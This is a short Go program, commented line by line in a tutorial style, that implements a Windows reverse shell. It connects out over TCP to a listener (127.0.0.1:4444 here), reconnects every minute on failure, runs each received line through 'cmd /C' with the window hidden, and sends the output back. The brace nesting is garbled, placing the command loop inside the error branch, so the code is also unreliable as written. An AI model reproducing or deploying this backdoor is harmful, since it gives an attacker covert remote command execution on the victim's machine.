package main

import (
	"bufio"
	"net"
	"os/exec"
	"syscall"
	"time"
)

func main() {
	shell("127.0.0.1:4444") //function main calls function shell with parameters
}

func shell(host string) { //func shell takes variable host, of string TYPE
	conn, err := net.Dial("tcp", host) //connect to host and port
	if nil != err {                 // if nil does not equal err
		if nil != conn {                 //if nil does not equal conn
  		conn.Close()                   // close the connection
		}
		time.Sleep(time.Minute) // pauses the current go routine for specified time
		shell(host) // run func shell()

	r := bufio.NewReader(conn) // returns new reader of VARIABLE 'c' whose buffer size is default
	for { // creating for loop to loop repeatedly until hitting return
		order, err := r.ReadString('\n') //  reads until the first occurrence of delim in the input, in this case, line break
		if nil != err { // if nil does not equal err
			conn.Close() //net.close()
			shell(host) // run func shell()
			return //hit return
		}

		cmd := exec.Command("cmd", "/C", order) // run CMD /C which reads VARIABLE order (Reads string until line break which is being looped until a connection is broke)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} // Calls win32 API and sets attribute to hide window to TRUE
		out, _ := cmd.CombinedOutput() // VARIABLE out = CombinedOutput runs the command and returns its combined standard output and standard error.

		conn.Write(out) // Write implements the Conn Write method to VARIABLE out
	}
}
}
